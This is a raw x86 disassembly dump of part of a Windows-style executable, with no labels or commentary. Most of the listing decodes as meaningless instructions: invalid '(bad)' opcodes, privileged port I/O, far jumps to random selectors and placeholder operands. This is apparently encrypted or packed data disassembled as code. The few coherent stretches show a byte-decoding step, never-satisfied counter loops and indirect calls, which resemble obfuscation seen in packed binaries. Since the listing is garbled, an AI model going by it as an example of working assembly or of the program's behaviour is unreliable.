  40634f:	lfs    esp,FWORD PTR [esi+0x35]
  406353:	dec    edx
  406354:	mov    al,ds:0x78bdf27c
  406359:	fdivr  QWORD PTR [edi]
  40635b:	adc    BYTE PTR [edx],0xcc
  40635e:	mov    bl,0xcf
  406360:	in     al,dx
  406361:	cld    
  406362:	mov    dl,0x12
  406364:	mov    ch,0x7c
  406366:	gs loopne 0x4063a5
  406369:	jl     0x406353
  40636b:	adc    eax,0x47893f61
  406370:	sbb    DWORD PTR ds:0x4b732194,esi
  406376:	mov    edx,ecx
  406378:	jmp    0x4063ee
  40637a:	lea    ecx,ds:0xffaaa20c
  406380:	cmp    dl,ch
  406382:	xchg   edx,eax
  406383:	add    eax,0x42e945b2
  406388:	emms   
  40638a:	stos   DWORD PTR es:[edi],eax
  40638b:	add    al,0x58
  40638d:	fisttp QWORD PTR [edi+0x3486a76]
  406393:	pop    ss
  406394:	jne    0x4063ed
  406396:	and    ebp,DWORD PTR [eax+0x3b]
  406399:	sbb    eax,0x4223023e
  40639e:	pop    esi
  40639f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063a0:	mov    dl,0x6a
  4063a2:	mov    eax,0xdce38e3b
  4063a7:	pop    esp
  4063a8:	mov    bh,0xb7
  4063aa:	into   
  4063ab:	push   esi
  4063ac:	inc    esp
  4063ad:	cs lahf 
  4063af:	test   BYTE PTR [esp+eax*4],0x12
  4063b3:	div    edi
  4063b5:	out    dx,eax
  4063b6:	inc    edx
  4063b7:	xlat   BYTE PTR ds:[ebx]
  4063b8:	push   DWORD PTR [ebp-0xc]
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x65e0,0x13
  4063d1:	sub    ebx,ecx
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x406446
  4063dc:	shl    DWORD PTR [ebx-0x59],cl
  4063df:	jp     0x40645b
  4063e1:	fisttp DWORD PTR [ebp+0x2b]
  4063e4:	add    dl,dl
  4063e6:	mov    edx,0xf72a4889
  4063eb:	cdq    
  4063ec:	out    dx,al
  4063ed:	aaa    
  4063ee:	push   DWORD PTR [edi-0x2a]
  4063f1:	push   0xffffffe0
  4063f3:	out    dx,al
  4063f4:	int3   
  4063f5:	jl     0x4063e0
  4063f7:	xchg   esi,eax
  4063f8:	inc    edx
  4063f9:	jns    0x4063be
  4063fb:	pop    eax
  4063fc:	lds    esi,FWORD PTR [eax]
  4063fe:	ja     0x406413
  406400:	xchg   ebx,eax
  406401:	push   0x847aa0b3
  406406:	icebp  
  406407:	cdq    
  406408:	adc    edx,ecx
  40640a:	push   eax
  40640b:	inc    esp
  40640c:	and    eax,0x764cec6c
  406411:	data16 mov BYTE PTR [edi+0x614788f9],cl
  406418:	scas   eax,DWORD PTR es:[edi]
  406419:	jne    0x406416
  40641b:	lds    ebp,FWORD PTR [edx+0x3a0f7161]
  406421:	push   esp
  406422:	sub    eax,0xf137709c
  406427:	retf   
  406428:	data16 hlt 
  40642a:	xchg   edi,eax
  40642b:	pusha  
  40642c:	mov    ebp,0x8b679a13
  406431:	int    0xa3
  406433:	push   0x3a
  406435:	mov    al,0x1
  406437:	fnsave [edx-0x13c865db]
  40643d:	xor    ebp,0xfffffffc
  406440:	mov    esp,?
  406442:	leave  
  406443:	adc    DWORD PTR gs:[edx-0x865ce02],0x10
  40644b:	jmp    DWORD PTR [edi+eax*1-0x1e]
  40644f:	cmp    edx,DWORD PTR [eax]
  406451:	gs jbe 0x406436
  406454:	xchg   edi,eax
  406455:	xor    BYTE PTR [ebp+0x46],al
  406458:	inc    edx
  406459:	aad    0x30
  40645b:	out    dx,eax
  40645c:	mov    cl,0xb8
  40645e:	shl    BYTE PTR [esi+ebx*8],1
  406461:	test   DWORD PTR [edi],edx
  406463:	push   esp
  406464:	push   ss
  406465:	mov    dl,0x2b
  406467:	cmp    eax,0x7c5f5a4a
  40646c:	add    BYTE PTR [esi-0x74],0xdd
  406470:	mov    edi,0x8aa9fa39
  406475:	sar    DWORD PTR [esi-0x287f94d6],1
  40647b:	xor    eax,DWORD PTR [esi+0x54]
  40647e:	adc    eax,0xe1f2f0d0
  406483:	pusha  
  406484:	retf   
  406485:	aas    
  406486:	add    ch,bh
  406488:	cwde   
  406489:	mov    edi,0x20bf0e80
  40648e:	(bad)  
  406490:	outs   dx,BYTE PTR ds:[esi]
  406491:	jmp    0x53dc:0x795f18fe
  406498:	in     eax,0x63
  40649a:	fisttp DWORD PTR [ebp-0x607793f2]
  4064a0:	jns    0x406434
  4064a2:	icebp  
  4064a3:	mov    WORD PTR [ecx],?
  4064a5:	mov    dl,0xa0
  4064a7:	adc    al,0xb3
  4064a9:	retf   0xe52f
  4064ac:	inc    ebp
  4064ad:	or     DWORD PTR [ecx-0x77],0xdd24f4b0
  4064b4:	add    BYTE PTR [edx-0x1921206],al
  4064ba:	stc    
  4064bb:	scas   al,BYTE PTR es:[edi]
  4064bc:	jne    0x40650f
  4064be:	mov    dh,0xf2
  4064c0:	mov    dl,cl
  4064c2:	push   ds
  4064c3:	icebp  
  4064c4:	outs   dx,BYTE PTR ds:[esi]
  4064c5:	push   es
  4064c6:	ins    DWORD PTR es:[edi],dx
  4064c7:	cmp    al,0xd
  4064c9:	out    0xf1,al
  4064cb:	sti    
  4064cc:	dec    edi
  4064cd:	mov    al,ds:0x19d2571a
  4064d2:	lods   al,BYTE PTR ds:[esi]
  4064d3:	mov    eax,ds:0xf903903
  4064d8:	test   cl,0x33
  4064db:	mov    fs,edi
  4064dd:	ins    DWORD PTR es:[edi],dx
  4064de:	jo     0x40648d
  4064e0:	dec    ecx
  4064e1:	hlt    
  4064e2:	and    ebp,DWORD PTR [edx+0xa75f2f7]
  4064e8:	nop
  4064e9:	aaa    
  4064ea:	call   0x4bf6:0x54d2091c
  4064f1:	jne    0x40653b
  4064f3:	push   ebp
  4064f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064f5:	xor    ch,dl
  4064f7:	ins    DWORD PTR es:[edi],dx
  4064f8:	test   DWORD PTR [ebx-0x2622cb4c],edx
  4064fe:	sbb    al,ch
  406500:	jge    0x406482
  406502:	push   esi
  406503:	clc    
  406504:	ja     0x406556
  406506:	fs jmp 0x7fe1:0xcaf32acd
  40650e:	pushf  
  40650f:	push   eax
  406510:	dec    edx
  406511:	rol    BYTE PTR [ecx],cl
  406513:	sbb    DWORD PTR [ecx-0x7709a25],0x5b
  40651a:	jecxz  0x4064a9
  40651c:	xlat   BYTE PTR ds:[ebx]
  40651d:	loopne 0x406511
  40651f:	cwde   
  406520:	(bad)
  406524:	mov    dl,0x7c
  406526:	and    ebx,ecx
  406528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406529:	(bad)  
  40652a:	dec    ebp
  40652b:	std    
  40652c:	mov    edi,0x6203b79
  406531:	xor    DWORD PTR [eax+0x29102981],0xffffffdc
  406538:	cmp    eax,0x53f0ecd8
  40653d:	jne    0x406552
  40653f:	push   0x97ee5217
  406544:	pop    esp
  406545:	ror    BYTE PTR [edi+0x2881d72e],0x47
  40654c:	adc    BYTE PTR [edi+0xac29fb1],al
  406552:	jmp    0xca80:0x293891b6
  406559:	loopne 0x40655d
  40655b:	mov    dh,0x7d
  40655d:	(bad)  [edx+0x68]
  406560:	pop    es
  406561:	les    eax,FWORD PTR [eax]
  406563:	xor    al,0xbf
  406565:	xor    al,0x29
  406567:	push   cs
  406568:	jmp    0x51d63d4d
  40656d:	sub    esp,DWORD PTR [edx-0x63]
  406570:	sti    
  406571:	add    BYTE PTR [edi],0x8f
  406574:	ror    BYTE PTR [eax-0x71],1
  406577:	xchg   esp,eax
  406578:	inc    edx
  406579:	xchg   edi,eax
  40657a:	xchg   edx,eax
  40657b:	ss enter 0x8ae8,0x66
  406580:	pop    esi
  406581:	scas   eax,DWORD PTR es:[edi]
  406582:	add    eax,0xdbacac2d
  406587:	add    DWORD PTR [ebx-0x26],ebp
  40658a:	xor    ebx,ebx
  40658c:	retf   0xbfdb
  40658f:	dec    edi
  406590:	(bad)  
  406591:	fbstp  TBYTE PTR [ecx+edx*2]
  406594:	push   esi
  406595:	stc    
  406596:	cmp    DWORD PTR [eax],esp
  406598:	call   0xf11b3677
  40659d:	push   edx
  40659e:	test   eax,0xa4187e5
  4065a3:	(bad)  
  4065a4:	lods   eax,DWORD PTR ds:[esi]
  4065a5:	inc    edi
  4065a6:	push   cs
  4065a7:	inc    esi
  4065a8:	cmp    eax,0x6286b299
  4065ad:	scas   al,BYTE PTR es:[edi]
  4065ae:	jecxz  0x4065e8
  4065b0:	and    al,0xf6
  4065b2:	in     al,0xaa
  4065b4:	enter  0xe81e,0x8e
  4065b8:	out    0xff,eax
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1-0x32306983]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x40663a
  40660b:	inc    esp
  40660c:	pop    es
  40660d:	push   ss
  40660e:	stc    
  40660f:	inc    esp
  406610:	retf   
  406611:	lods   al,BYTE PTR ds:[esi]
  406612:	int3   
  406613:	xchg   edx,eax
  406614:	dec    eax
  406615:	(bad)  [ecx]
  406617:	out    0x89,eax
  406619:	addr16 dec ebp
  40661b:	sub    eax,ebx
  40661d:	jbe    0x4065ba
  40661f:	cmp    ecx,DWORD PTR [edi-0x2f]
  406622:	pusha  
  406623:	mov    ebx,0x3c94e04d
  406628:	test   DWORD PTR [edx+ebx*8],ebx
  40662b:	call   0x9b38838a
  406630:	in     al,0x9a
  406632:	push   edx
  406633:	mov    ebx,0x1b74ab45
  406638:	pop    ecx
  406639:	add    al,0x49
  40663b:	dec    ecx
  40663c:	enter  0x76f9,0x94
  406640:	adc    ch,ch
  406642:	adc    BYTE PTR [edx],0x64
  406645:	iret   
  406646:	ret    0xd084
  406649:	lds    edi,FWORD PTR [esi]
  40664b:	loopne 0x406667
  40664d:	ja     0x40663a
  40664f:	pusha  
  406650:	sub    bh,al
  406652:	sti    
  406653:	cld    
  406654:	sar    DWORD PTR [esi+0x748e4174],0x85
  40665b:	xchg   ebx,eax
  40665c:	sub    al,0xbf
  40665e:	adc    edx,ecx
  406660:	call   0x87f8:0xb7eeb7a9
  406667:	repz xchg ecx,eax
  406669:	repz ret 
  40666b:	push   ebp
  40666c:	and    BYTE PTR [ecx+0x7f],bh
  40666f:	shr    DWORD PTR [ecx+ebp*4],cl
  406672:	cmp    eax,0x36c7c9d5
  406677:	jb     0x4066e6
  406679:	daa    
  40667a:	stos   DWORD PTR es:[edi],eax
  40667b:	lods   eax,DWORD PTR ds:[esi]
  40667c:	jmp    0xdc2e2dd1
  406681:	daa    
  406682:	test   DWORD PTR ds:0x8fa05024,0xcb1394f9
  40668c:	retf   0x49a9
  40668f:	jno    0x406636
  406691:	cmp    DWORD PTR [edx-0x2c],ebp
  406694:	adc    al,0xe2
  406696:	jecxz  0x4066e7
  406698:	iret   
  406699:	mov    eax,0x1e984a2c
  40669e:	sbb    ebp,DWORD PTR [ecx+eiz*1]
  4066a1:	(bad)  
  4066a2:	pop    ebx
  4066a3:	add    cl,BYTE PTR [eax-0x50070d17]
  4066a9:	sub    ah,BYTE PTR [esi+0x20d91fc5]
  4066af:	adc    edx,0xeebea028
  4066b5:	stos   BYTE PTR es:[edi],al
  4066b6:	test   DWORD PTR ds:0x6cdaed31,eax
  4066bc:	hlt    
  4066bd:	ins    DWORD PTR es:[edi],dx
  4066be:	loope  0x40666b
  4066c0:	xchg   cl,al
  4066c2:	cmp    eax,0x96a8e5ac
  4066c7:	xor    eax,0x8abbdb74
  4066cc:	lea    ebp,[eax+0x10623ecf]
  4066d2:	jb     0x4066d5
  4066d4:	jmp    0x314e:0x1c586697
  4066db:	aas    
  4066dc:	aad    0xdd
  4066de:	push   esp
  4066df:	lahf   
  4066e0:	jg     0x4066a7
  4066e2:	mov    ebx,0xa5980390
  4066e7:	aam    0xd2
  4066e9:	dec    edi
  4066ea:	push   edx
  4066eb:	push   cs
  4066ec:	dec    ebx
  4066ed:	cmp    eax,0x16e219fc
  4066f2:	jb     0x4066bf
  4066f4:	or     ecx,0x40
  4066f7:	es retf 
  4066f9:	in     al,0x0
  4066fb:	icebp  
  4066fc:	or     ecx,esp
  4066fe:	repnz dec esp
  406700:	pop    ebx
  406701:	(bad)  
  406702:	addr16 in eax,0x8d
  406705:	lds    esp,FWORD PTR [edx+0x6c]
  406708:	xchg   esi,eax
  406709:	les    ecx,FWORD PTR [edi]
  40670b:	arpl   di,si
  40670d:	fs jo  0x406763
  406710:	lds    ecx,FWORD PTR [ecx]
  406712:	xchg   esp,eax
  406713:	sar    BYTE PTR [eax],1
  406715:	add    edi,esi
  406717:	outs   dx,BYTE PTR ds:[esi]
  406718:	push   ds
  406719:	das    
  40671a:	push   eax
  40671b:	in     eax,dx
  40671c:	xor    BYTE PTR [edx-0x644377e8],ch
  406722:	pop    ds
  406723:	das    
  406724:	in     al,0xd
  406726:	inc    eax
  406727:	out    dx,eax
  406728:	clc    
  406729:	inc    esp
  40672a:	xchg   edx,eax
  40672b:	stos   DWORD PTR es:[edi],eax
  40672c:	enter  0xf7e3,0x4f
  406730:	xor    BYTE PTR [ebx+0x10315ea9],al
  406736:	mov    bh,0x8
  406738:	sbb    eax,0x5c4bacff
  40673d:	cli    
  40673e:	sbb    DWORD PTR [ebp-0x55],eax
  406741:	cld    
  406742:	add    eax,0xe0a79714
  406747:	sbb    eax,0xb3fad766
  40674c:	xchg   edi,eax
  40674d:	xor    DWORD PTR [edx],ebp
  40674f:	mov    fs,ebx
  406751:	jo     0x4066f0
  406753:	fs aas 
  406755:	enter  0x745b,0xe
  406759:	xchg   esi,eax
  40675a:	arpl   WORD PTR [esi+0x9dab968],sp
  406760:	pop    es
  406761:	retf   0x3bf9
  406764:	neg    DWORD PTR [ecx+esi*4+0x19]
  406768:	inc    eax
  406769:	mov    dl,ch
  40676b:	inc    ebx
  40676c:	inc    edi
  40676d:	cld    
  40676e:	mov    esi,0x7bc39169
  406773:	push   edx
  406774:	ret    
  406775:	stc    
  406776:	cmp    dl,BYTE PTR [ebx]
  406778:	inc    edi
  406779:	mov    WORD PTR [edx+esi*1],cs
  40677c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40677d:	loope  0x406783
  40677f:	mov    edx,0xe002db80
  406784:	jecxz  0x406794
  406786:	lods   al,BYTE PTR ds:[esi]
  406787:	pop    esi
  406788:	call   0x871b1768
  40678d:	test   BYTE PTR [eax+0x29],ah
  406790:	push   edx
  406791:	dec    edx
  406792:	mov    dl,BYTE PTR [ecx-0x53]
  406795:	in     eax,dx
  406796:	icebp  
  406797:	jge    0x406722
  406799:	sub    ah,BYTE PTR [esi]
  40679b:	repnz and DWORD PTR ds:[ecx+eiz*8-0x10],0x262cd446
  4067a5:	cmp    edx,edx
  4067a7:	push   ebx
  4067a8:	lods   eax,DWORD PTR ds:[esi]
  4067a9:	std    
  4067aa:	sbb    al,BYTE PTR [edx+eiz*1+0x30]
  4067ae:	adc    BYTE PTR [edx+0x11e4f40f],dh
  4067b4:	mov    edx,0xf3a484aa
  4067b9:	(bad)  
  4067ba:	scas   eax,DWORD PTR es:[edi]
  4067bb:	imul   esp,DWORD PTR [ebx-0x48829ba2],0x8add1120
  4067c5:	lods   eax,DWORD PTR ds:[esi]
  4067c6:	jle    0x406847
  4067c8:	ins    DWORD PTR es:[edi],dx
  4067c9:	push   esi
  4067ca:	out    dx,eax
  4067cb:	sbb    al,0x87
  4067cd:	jmp    0x555e:0x1ad07944
  4067d4:	inc    edx
  4067d5:	cwde   
  4067d6:	cmp    DWORD PTR [ebp-0x32e29c42],0xffffff80
  4067dd:	mov    BYTE PTR [ecx+0x77],cl
  4067e0:	ins    DWORD PTR es:[edi],dx
  4067e1:	fisub  DWORD PTR [ecx+ebx*4-0x66]
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x4736:0x4f8af6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	jle    0x406869
  406866:	(bad)  
  406867:	and    eax,0x8712c223
  40686c:	stos   DWORD PTR es:[edi],eax
  40686d:	in     eax,0xa4
  40686f:	ss gs mov cl,0x10
  406873:	ret    0x8a70
  406876:	stos   DWORD PTR es:[edi],eax
  406877:	in     al,dx
  406878:	jo     0x40683d
  40687a:	out    0x6d,eax
  40687c:	mov    ebx,0xa95de379
  406881:	mov    BYTE PTR [edx+esi*8-0x52bef98c],bl
  406888:	loopne 0x406826
  40688a:	sbb    al,0xf2
  40688c:	daa    
  40688d:	fdivr  QWORD PTR [ebx-0x46]
  406890:	scas   al,BYTE PTR es:[edi]
  406891:	test   BYTE PTR [esi+0x544c74f0],0x3c
  406898:	xor    cl,bl
  40689a:	or     eax,0xc50022d1
  40689f:	lods   al,BYTE PTR ds:[esi]
  4068a0:	add    ebx,DWORD PTR [esi]
  4068a2:	popf   
  4068a3:	dec    edx
  4068a4:	imul   esi,DWORD PTR es:[ecx-0x5d],0xf86e8242
  4068ac:	aad    0x48
  4068ae:	inc    esi
  4068af:	ins    BYTE PTR es:[edi],dx
  4068b0:	jl     0x4068fb
  4068b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b3:	stos   BYTE PTR es:[edi],al
  4068b4:	rol    DWORD PTR [ebx],0x97
  4068b7:	fiadd  DWORD PTR [ebp+0x66a5c49e]
  4068bd:	cmp    BYTE PTR [edx],0x11
  4068c0:	push   0xcab95955
  4068c5:	sar    ebx,0x88
  4068c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068c9:	adc    BYTE PTR [edx],bh
  4068cb:	(bad)  
  4068cc:	cmp    al,0xee
  4068ce:	lock push edi
  4068d0:	inc    esi
  4068d1:	push   es
  4068d2:	cdq    
  4068d3:	inc    esi
  4068d5:	aad    0xe7
  4068d7:	inc    edi
  4068d8:	stos   DWORD PTR es:[edi],eax
  4068d9:	push   eax
  4068da:	(bad)  
  4068db:	les    ebp,FWORD PTR [edi+eax*4]
  4068de:	add    eax,0x3ad335b
  4068e3:	aad    0xd3
  4068e5:	std    
  4068e6:	mov    ch,0x37
  4068e8:	fwait
  4068e9:	ret    0x40e9
  4068ec:	bound  edi,QWORD PTR ds:0xd37be635
  4068f2:	pop    edi
  4068f3:	lahf   
  4068f4:	xor    BYTE PTR [edx],dh
  4068f6:	sbb    BYTE PTR [esi-0x3a],cl
  4068f9:	push   ss
  4068fa:	jmp    0x4068e8
  4068fc:	ficom  WORD PTR ds:[edx+0x5e25febb]
  406903:	mov    cs,WORD PTR [esp+ebx*1-0x1e]
  406907:	push   es
  406908:	scas   eax,DWORD PTR es:[edi]
  406909:	inc    BYTE PTR [eax]
  40690b:	jle    0x406945
  40690d:	scas   eax,DWORD PTR es:[edi]
  40690e:	mov    dl,al
  406910:	and    esp,esp
  406912:	mov    ch,bh
  406914:	adc    BYTE PTR [edi+0x3f],bh
  406917:	xchg   DWORD PTR [edi],esi
  406919:	loope  0x406994
  40691b:	mov    bl,0xb
  40691d:	xor    BYTE PTR [eax],dh
  40691f:	mov    dh,cl
  406921:	add    eax,0x62cb2616
  406926:	lea    eax,[ecx+0x10]
  406929:	adc    eax,0xe0a1129c
  40692e:	imul   esi,ecx,0xe72ad2e5
  406934:	push   0xa0e8eaa5
  406939:	sub    BYTE PTR [ebp+0x22bf8eca],0xd
  406940:	lahf   
  406941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406942:	leave  
  406943:	aaa    
  406944:	adc    BYTE PTR [ecx+0x548030e9],0xc3
  40694b:	pop    ebp
  40694c:	mov    esi,0x7987528e
  406951:	sub    BYTE PTR [eax],ah
  406953:	inc    edx
  406954:	aad    0x2
  406956:	stc    
  406957:	mov    edx,0x4968ab32
  40695c:	push   cs
  40695d:	popf   
  40695e:	inc    edi
  40695f:	mov    ch,BYTE PTR [edi]
  406961:	dec    esi
  406962:	and    dh,BYTE PTR [edi-0x9]
  406965:	mov    BYTE PTR [edi],bl
  406967:	xchg   edi,eax
  406968:	push   0xc9696986
  40696d:	sub    al,BYTE PTR [edx-0x7ea9ee7c]
  406973:	scas   al,BYTE PTR es:[edi]
  406974:	in     eax,dx
  406975:	adc    BYTE PTR [ebp-0xa738b20],bl
  40697b:	les    esi,FWORD PTR [edi+0x69]
  40697e:	hlt    
  40697f:	pop    ebx
  406980:	or     ah,BYTE PTR [ebx+0x56]
  406983:	shl    DWORD PTR [edx-0x77],0x50
  406987:	mov    ecx,0x7ae6c134
  40698c:	xor    BYTE PTR [edx-0x7d7dad42],bh
  406992:	inc    ebx
  406993:	(bad)  
  406995:	in     eax,dx
  406996:	pop    esp
  406997:	push   cs
  406998:	adc    DWORD PTR [eax+0x5d],ecx
  40699b:	repz add bl,bl
  40699e:	adc    DWORD PTR [ebp-0x46a63e13],esi
  4069a4:	sbb    al,0xbb
  4069a6:	jg     0x406951
  4069a8:	mov    ebx,0xa53a4a33
  4069ad:	jp     0x406930
  4069af:	ror    DWORD PTR [ecx-0x38],cl
  4069b2:	and    al,0x5c
  4069b4:	inc    edx
  4069b5:	mov    ebx,0xc8fa4d6f
  4069ba:	jg     0x4069bf
  4069bc:	and    al,0x7e
  4069be:	sub    eax,0x7952fbb6
  4069c3:	dec    eax
  4069c4:	cmp    cl,BYTE PTR [ebx]
  4069c6:	mov    edx,0x225227be
  4069cb:	sti    
  4069cc:	hlt    
  4069cd:	sahf   
  4069ce:	popa   
  4069cf:	out    0xd,al
  4069d1:	or     eax,ebp
  4069d3:	push   esp
  4069d4:	mov    ch,0xbf
  4069d6:	or     BYTE PTR [si-0x4faf],ah
  4069db:	mov    dl,0xbf
  4069dd:	ss in  eax,dx
  4069df:	mov    eax,0x9586cab2
  4069e4:	fcomp  QWORD PTR [ebp+0x76]
  4069e7:	ja     0x406a08
  4069e9:	es mov bh,0x6b
  4069ec:	jle    0x406a35
  4069ee:	data16 mov dl,0xa9
  4069f1:	lods   eax,DWORD PTR ds:[esi]
  4069f2:	cwde   
  4069f3:	mov    edx,eax
  4069f5:	push   esp
  4069f6:	cli    
  4069f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069f8:	neg    DWORD PTR [ecx]
  4069fa:	fwait
  4069fb:	pop    esi
  4069fc:	mov    eax,ds:0x8c3ad4ef
  406a01:	cmp    BYTE PTR [eax+0x57281ff7],bl
  406a07:	loop   0x4069b2
  406a09:	inc    esp
  406a0a:	push   ds
  406a0b:	imul   ebx,ecx,0xd4867470
  406a11:	jp     0x4069f4
  406a13:	sbb    BYTE PTR [edx],dh
  406a15:	jmp    0xaa99:0x70c8a45b
  406a1c:	sbb    bl,0x18
  406a1f:	repz clc 
  406a21:	xlat   BYTE PTR ds:[ebx]
  406a22:	pop    ecx
  406a23:	cmp    esp,DWORD PTR [edx]
  406a25:	out    dx,al
  406a26:	addr16 cmp al,0xd9
  406a29:	test   eax,0xc243379
  406a2e:	jmp    0x406a9b
  406a30:	xchg   BYTE PTR [ebp-0x15],ah
  406a33:	cwde   
  406a34:	xchg   ebx,ebp
  406a36:	aam    0xd1
  406a38:	inc    ecx
  406a39:	in     al,0x59
  406a3b:	fcomp  DWORD PTR [eax]
  406a3d:	test   BYTE PTR gs:[eax-0x1],bl
  406a41:	push   eax
  406a42:	add    DWORD PTR [ebx+0xd8be045],ecx
  406a48:	and    al,0x22
  406a4a:	inc    ecx
  406a4b:	add    BYTE PTR [ecx],al
  406a4d:	or     BYTE PTR [edi+0x5e],bl
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ede3,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ede3,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ede3,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ec1b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ede3
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ede3,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x4304e7
  406aa5:	xor    edi,DWORD PTR ds:0x430435
  406aab:	mov    DWORD PTR ds:0x4304e7,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x43045d,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x43045d
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x43045d,ecx
  406ad3:	cmp    DWORD PTR ds:0x43045d,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e8b7
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ec1f
  406af9:	cmp    DWORD PTR ds:0x43045d,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x4304df,0x15
  406b1d:	cmp    DWORD PTR ds:0x4304df,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x4304df,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e9df
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x4304df
  406b45:	dec    ecx
  406b46:	mov    DWORD PTR ds:0x4304df,ecx
  406b4c:	jmp    0x406b1d
  406b51:	sub    DWORD PTR ds:0x430435,ebx
  406b57:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  406b5e:	mov    edx,DWORD PTR [ebp+0x8]
  406b61:	sbb    edi,edi
  406b63:	mov    DWORD PTR [ebp-0x40],eax
  406b66:	mov    eax,0x7510854
  406b6b:	and    DWORD PTR ds:0x4304d7,0x0
  406b75:	jmp    0x406b87
  406b7a:	mov    ecx,DWORD PTR ds:0x4304d7
  406b80:	inc    ecx
  406b81:	mov    DWORD PTR ds:0x4304d7,ecx
  406b87:	cmp    DWORD PTR ds:0x4304d7,0x11
  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4304d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e7e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42eaa7
  406bbe:	jmp    0x406b7a
